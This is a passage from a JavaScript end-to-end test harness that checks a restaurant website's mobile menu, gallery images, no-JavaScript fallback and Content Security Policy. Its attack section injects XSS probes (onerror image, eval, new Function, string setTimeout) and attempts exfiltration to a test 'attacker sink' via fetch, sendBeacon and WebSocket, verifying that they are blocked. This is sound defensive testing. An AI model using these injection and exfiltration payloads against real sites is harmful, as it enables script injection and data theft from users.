    await waitFor("document.querySelector('#root h1') !== null", 15_000);
    await send("Input.synthesizeScrollGesture", { x: 195, y: 600, yDistance: -500, gestureSourceType: "touch", speed: 2000 });
    await sleep(600);
    const swipeHash = await evaluate("location.hash");
    record("menu", "touch scroll does not navigate", swipeHash === "" || swipeHash === "#/", `hash=${swipeHash}`);
    await tap(await point("document.querySelector('button[aria-label=\"Open menu\"]')", false));
    const opened = await waitFor("!!document.querySelector('button[aria-label=\"Close menu\"]')", 3000);
    const links = await evaluate("[...document.querySelectorAll('nav a')].filter((a) => a.textContent.trim() === 'Menu').map((a) => ({ visible: a.offsetParent !== null, rect: a.getBoundingClientRect().toJSON() }))");
    if (!opened) throw new Error(`hamburger tap did not open the menu; links=${JSON.stringify(links)}`);
    await tap(await point("[...document.querySelectorAll('nav a')].find((a) => a.textContent.trim() === 'Menu' && a.offsetParent !== null)", false));
    const tapped = await waitFor("location.pathname.endsWith('/menu') && !!document.querySelector('.menu-dish-name')", 4000);
    record("menu", "tap on mobile 'Menu' opens the menu page", opened && tapped, { opened, tapped });
    await sleep(800);
    const mobileLayout = await evaluate("({ overflow: document.documentElement.scrollWidth > innerWidth, clipped: [...document.querySelectorAll('.menu-category-section:not([hidden]) .menu-price')].some(e => e.getBoundingClientRect().right > innerWidth), categories: document.querySelectorAll('.menu-categories a').length })");
    record("menu", "mobile menu has no page overflow or clipped prices", !mobileLayout.overflow && !mobileLayout.clipped && mobileLayout.categories === 12, mobileLayout);
    if (screenshotDir) {
      const shot = await send("Page.captureScreenshot", { format: "png" });
      writeFileSync(join(screenshotDir, "menu-mobile.png"), Buffer.from(shot.data, "base64"));
    }
  });

  await step("images", "mobile gallery thumbnails", async () => {
    const seenBeforeGallery = await loadedSoFar();
    await navigate(`${site}/gallery`);
    await waitFor("document.title.startsWith('Gallery')", 5000);
    const height = await evaluate("document.documentElement.scrollHeight");
    for (let y = 0; y < height; y += 500) {
      await evaluate(`window.scrollTo({ top: ${y}, behavior: 'instant' })`);
      await sleep(120);
    }
    await sleep(800);
    const mobileReport = await galleryImageReport(seenBeforeGallery);
    record("images", "gallery thumbnails download resized variants on mobile", mobileReport.checked >= 20 && mobileReport.freshOriginals.length === 0, mobileReport);
  });
  await takeViolations();

  // ================= 2b. App bundle fails to load: the static fallback must still help =================
  scenario = "fallback";
  await step("resilience", "fallback when the app's JavaScript fails", async () => {
    await viewport(1280, 900, false);
    await navigate(`${site}/__nojs__`);
    await sleep(2500);
    const fallback = await evaluate(`(() => { const m = document.querySelector('[data-app-fallback]'); if (!m) return null;
      return { opacity: getComputedStyle(m).opacity, text: m.innerText, tel: m.querySelector('a[href^="tel:"]')?.getAttribute('href') ?? null }; })()`);
    record("resilience", "if the app's JavaScript fails, the fallback shows the name, address and phone",
      !!fallback && fallback.opacity === "1" && fallback.tel === "tel:+12528330239" && fallback.text.includes("1507 Carolina Ave"), fallback ?? "missing");
  });
  await takeViolations();

  await step("resilience", "full menu without JavaScript", async () => {
    await navigate(`${site}/__menu_nojs__`);
    await sleep(400);
    const staticMenu = await evaluate("({ items: document.querySelectorAll('[data-menu-item]').length, visible: [...document.querySelectorAll('[data-menu-item]')].filter(e => e.getClientRects().length).length, categories: document.querySelectorAll('.menu-category-section').length, schema: !!document.querySelector('[data-menu-schema-fallback]'), options: document.querySelectorAll('.menu-options > div').length })");
    record("resilience", "all 151 entries, 147 options and 11 categories are readable without the app bundle", staticMenu.items === 151 && staticMenu.visible === 151 && staticMenu.options === 147 && staticMenu.categories === 11 && staticMenu.schema, staticMenu);
    await click(await point("document.querySelector('a[data-category=\"pho\"]')"));
    record("resilience", "native category links still work without JavaScript", await evaluate("location.hash === '#menu-pho'"));
  });
  await takeViolations();

  // ================= 3. Injected markup / DOM-sink payloads =================
  scenario = "attack";
  await viewport(1280, 900, false);
  sinkHits.length = 0;
  await navigate(`${site}/__attack__`);
  await sleep(1500);
  await evaluate("document.getElementById('__jsurl').click(), true").catch(() => {});
  const dom = await evaluate(`(() => { try { document.body.insertAdjacentHTML('beforeend', '<img src="/__missing2.png" onerror="window.__xss_dom = 1">'); return 'inserted'; } catch (e) { return e.name; } })()`);
  const evalRes = await evaluate("(() => { try { eval('window.__xss_eval = 1'); return 'ran'; } catch (e) { return e.name; } })()");
  const fnRes = await evaluate("(() => { try { new Function('window.__xss_fn = 1')(); return 'ran'; } catch (e) { return e.name; } })()");
  const timerRes = await evaluate("(() => { try { setTimeout('window.__xss_timer = 1', 0); return 'scheduled'; } catch (e) { return e.name; } })()");
  const fetchRes = await evaluate(`fetch('${sink}/exfil-fetch?d=probe').then(() => 'sent', (e) => e.name)`);
  const beaconRes = await evaluate(`(() => { try { return String(navigator.sendBeacon('${sink}/exfil-beacon', 'probe')); } catch (e) { return e.name; } })()`);
  const wsRes = await evaluate(`new Promise((r) => { try { const s = new WebSocket('${sink.replace("http", "ws")}/exfil-ws');
    s.onopen = () => r('open'); s.onerror = () => r('error'); setTimeout(() => r('timeout'), 1500); } catch (e) { r(e.name); } })`);
  await sleep(1000);
  const flags = await evaluate(`({ inline: window.__xss_inline === 1, attr: window.__xss_attr === 1, external: window.__xss_external === 1,
    jsurl: window.__xss_jsurl === 1, dom: window.__xss_dom === 1, eval: window.__xss_eval === 1, fn: window.__xss_fn === 1,
    timer: window.__xss_timer === 1, baseHijacked: !document.baseURI.startsWith(location.origin) })`);
  await evaluate("document.getElementById('__form').submit(), true").catch(() => {});
  await sleep(1500);
  const attackViolations = await takeViolations();
  const exfil = sinkHits.splice(0);
  const executed = Object.entries(flags).filter(([, v]) => v).map(([k]) => k);
  const attackDetail = { executed, sinkHits: exfil.map((h) => `${h.method} ${h.path}`), dom, evalRes, fnRes, timerRes, fetchRes, beaconRes, wsRes,
    blockedBy: [...new Set(attackViolations.map((v) => v.directive))].sort() };

  if (protectedMode) {
    for (const name of ["inline", "attr", "external", "jsurl", "dom", "eval", "fn", "timer", "baseHijacked"]) {
      record("attack", `payload '${name}' did not execute`, !flags[name]);
    }
    record("attack", "DOM sink rejected by Trusted Types", dom === "TypeError", dom);
    record("attack", "nothing reached the attacker sink (img/css/frame/object/fetch/beacon/ws/form)", exfil.length === 0, attackDetail.sinkHits);
    record("attack", "violations reported for the blocked payloads", attackViolations.length >= 8, attackDetail.blockedBy.join(", "));
  } else {
    record("attack", "(baseline) harness detects payload execution / exfiltration", executed.length > 0 || exfil.length > 0, attackDetail);
  }

  // ================= 4. Known residual: CSP cannot stop top-level navigation =================
  scenario = "residual-navigation";
  sinkHits.length = 0;
  await navigate(`${site}/__attack_nav__`).catch(() => {});
  await sleep(2000);
  const navHit = sinkHits.some((h) => h.path.startsWith("/exfil-nav"));
  checks.push({ group: "residual", name: "meta-refresh navigation to another origin (not blockable by CSP)", pass: true,
    detail: navHit ? "navigation reached sink — residual risk confirmed" : "no navigation observed", informational: true });

  // ================= Summary =================
  const featureViolations = violations.filter((v) => v.scenario.startsWith("features"));
  const featureErrors = pageErrors.filter((e) => e.scenario.startsWith("features"));
  record("app", "zero CSP violations during legitimate use", featureViolations.length === 0, featureViolations);
  record("app", "zero uncaught page errors during legitimate use", featureErrors.length === 0, featureErrors);

  const report = { dist, base, expect: expectMode, at: new Date().toISOString(), checks, attack: attackDetail, violations, pageErrors };
  if (outPath) writeFileSync(outPath, JSON.stringify(report, null, 2));
  for (const c of checks) {
    const tag = c.informational ? "INFO" : c.pass ? "PASS" : "FAIL";
    console.log(`${tag}  [${c.group}] ${c.name}${c.pass && !c.informational ? "" : `  -> ${c.detail}`}`);
  }
  if (protectedMode) console.log(`blocked-by directives: ${attackDetail.blockedBy.join(", ")}`);
  const failed = checks.filter((c) => !c.pass && !c.informational);
  console.log(`\n${failed.length ? "FAILED" : "OK"}: ${checks.length - failed.length}/${checks.length} checks passed (${expectMode}, base ${base})`);
  process.exitCode = failed.length ? 1 : 0;
} catch (error) {
  console.error("FAIL:", error);
  process.exitCode = 1;
} finally {
  clearTimeout(watchdog);
  await cleanup();
  // Lingering keep-alive/WebSocket handles from the killed browser must not keep CI waiting.
  process.exit(process.exitCode ?? 1);
}
